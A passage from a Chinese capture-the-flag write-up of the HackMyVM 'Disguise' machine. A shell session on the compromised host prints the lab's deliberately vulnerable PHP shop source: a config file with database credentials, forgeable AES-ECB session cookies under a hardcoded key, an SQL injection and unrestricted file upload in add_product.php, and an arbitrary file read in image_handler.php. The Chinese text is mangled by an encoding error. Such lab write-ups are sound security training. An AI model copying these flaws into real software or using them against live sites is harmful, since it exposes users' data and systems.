error_reporting(E_ALL);
ini_set('display_errors', 1);

// Verify GD
if (!extension_loaded('gd')) {
    header('Content-Type: text/plain');
    die('GD extension not loaded');
}

// Generate CAPTCHA code
$chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
$captcha = substr(str_shuffle($chars), 0, 6);
$_SESSION['captcha'] = $captcha;

// Create image
$width = 120;
$height = 40;
$image = imagecreatetruecolor($width, $height);

if (!$image) {
    header('Content-Type: text/plain');
    die('Failed to create image');
}

// Colors
$bg = imagecolorallocate($image, 30, 30, 30);
$text = imagecolorallocate($image, 200, 200, 200);
imagefilledrectangle($image, 0, 0, $width, $height, $bg);

// Add text
$font = 5; // Built-in font
imagestring($image, $font, 10, 10, $captcha, $text);

// Output
header('Content-Type: image/png');
imagepng($image);
imagedestroy($image);
?>
darksoul@disguise:/var/www/dark# cat config.php
<?php

$DB_USER = 'dark_db_admin';
$DB_PASS = 'Str0ngPassw0d1***';
$DB_NAME = 'dark_shop';

?>
darksoul@disguise:/var/www/dark# cat functions.php
<?php
session_start();

include 'config.php';

function db_connect() {
    global $DB_USER,$DB_PASS,$DB_NAME;
    $conn = new mysqli('localhost', $DB_USER, $DB_PASS, $DB_NAME);
    if ($conn->connect_error) {
        die("è¿æ¥å¤±è´¥: " . $conn->connect_error);
    }
    return $conn;
}

function generate_captcha() {
    $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    $captcha = substr(str_shuffle($chars), 0, 6);
    $_SESSION['captcha'] = $captcha;
    return $captcha;
}

function verify_captcha($input) {
    return isset($_SESSION['captcha']) && strtoupper($input) === $_SESSION['captcha'];
}

function aes_encrypt($data, $key) {
    return openssl_encrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
}

function aes_decrypt($data, $key) {
    return openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
}

function set_dark_session($username, $isAdmin) {
    $modified = 'bili' . $username;
    $encrypted = openssl_encrypt($modified, 'AES-128-ECB', 'secret_key_2a8d32a', OPENSSL_RAW_DATA);
    setcookie('dark_session', base64_encode($encrypted), 0, '/');
}

function get_dark_session($dark_session){
    $encrypted = base64_decode($dark_session);
    $decrypted = openssl_decrypt($encrypted, 'AES-128-ECB', 'secret_key_2a8d32a', OPENSSL_RAW_DATA);
    return $username = substr($decrypted, 4);
}

function is_admin($username) {
    $conn = db_connect();
    $stmt = $conn->prepare("SELECT isAdmin FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        return (int)$row['isAdmin'];
    }
    
    $stmt->close();
    $conn->close();
    return 0;
}

?>
darksoul@disguise:/var/www/dark# cat image_handler.php
<?php
include 'functions.php';

if(!isset($_GET['id'])) {
    http_response_code(400);
    exit('Invalid request');
}

$conn = db_connect();
$stmt = $conn->prepare("SELECT image FROM products WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();

if($result->num_rows === 0) {
    http_response_code(404);
    exit('Image not found');
}

$product = $result->fetch_assoc();
$image_path = $product['image'];

if(!file_exists($image_path)) {
    http_response_code(404);
    exit('Image file not found');
}

$mime_type = mime_content_type($image_path);
header("Content-Type: $mime_type");
readfile($image_path);
?>
darksoul@disguise:/var/www/dark# cd manager
darksoul@disguise:/var/www/dark/manager# ls -la
total 16
drwxr-xr-x 2 root     root     4096 Apr  1 22:59 .
drwxr-xr-x 4 www-data www-data 4096 Apr  2 04:39 ..
-rw-r--r-- 1 root     root     1801 Apr  1 21:26 add_product.php
-rw-r--r-- 1 root     root      830 Apr  1 22:59 index.php
darksoul@disguise:/var/www/dark/manager# cat add_product.php 
<?php 
include '../functions.php';

if(!isset($_COOKIE['dark_session'])){
    header("Location: ../login.php");
    exit();
}

$username = get_dark_session($_COOKIE['dark_session']);
$isAdmin = is_admin($username);

if(!$isAdmin) {
    header("Location: ../login.php");
    exit();
}

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $name = $_POST['name'];
    $description = $_POST['description'];
    $price = $_POST['price'];
    
    $uuid = bin2hex(random_bytes(16));
    $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
    $new_filename = $uuid . '.' . $ext;
    $image_path = 'images/' . $new_filename;

    move_uploaded_file($_FILES['image']['tmp_name'], '../' . $image_path);
    
    $conn = db_connect();
    $sql = "INSERT INTO products (name, description, price, image) VALUES ('$name','$description','$price','$image_path')";
    
    if ($conn->query($sql) === TRUE) {
        echo "æ–°å•†å“æ·»åŠ æˆåŠŸï¼ŒID: " . $conn->insert_id;
    } else {
        echo "å•†å“æ·»åŠ å¤±è´¥: " . $conn->error;
    }

    $conn->close();
    
    header("Location: ../index.php");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>æ·»åŠ å•†å“ - æš—é»‘å•†åº—</title>
    <link rel="stylesheet" href="../style4.css">
</head>
<body>
    <div class="auth-form">
        <h2>æ·»åŠ å•†å“</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="text" name="name" placeholder="å•†å“åç§°" required>
            <textarea name="description" placeholder="å•†å“æè¿°" required></textarea>
            <input type="number" step="0.01" name="price" placeholder="ä»·æ ¼" required>
            <input type="file" name="image" accept="image/*" required>
            <button type="submit">æ·»åŠ å•†å“</button>
        </form>
    </div>
</body>
</html>
```

## å‚è€ƒ

https://www.bilibili.com/video/BV1jbVizjEGE/

https://pepster.me/HackMyVM-Disguise-Walkthrough/

https://sunsetaction.top/2025/05/13/HackMyVMDisguise/